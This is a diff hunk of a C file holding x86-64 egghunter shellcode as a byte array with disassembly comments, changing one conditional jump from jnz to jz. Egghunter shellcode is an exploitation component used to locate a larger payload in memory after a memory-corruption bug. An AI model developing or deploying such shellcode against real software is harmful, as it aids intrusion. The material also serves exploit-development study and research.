@@ -15,7 +15,7 @@ char EGG[] = {
   /* 0012 */ "\x0f\x05"             /* syscall             */
   /* 0014 */ "\x5f"                 /* pop rdi             */
   /* 0015 */ "\x3c\xf2"             /* cmp al, 0xf2        */
-  /* 0017 */ "\x75\xef"             /* jnz 0x8             */
+  /* 0017 */ "\x74\xef"             /* jz 0x8              */
   /* 0019 */ "\xcc"                 /* int3                */
   /* 001A */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
   /* 001F */ "\xaf"                 /* scasd               */
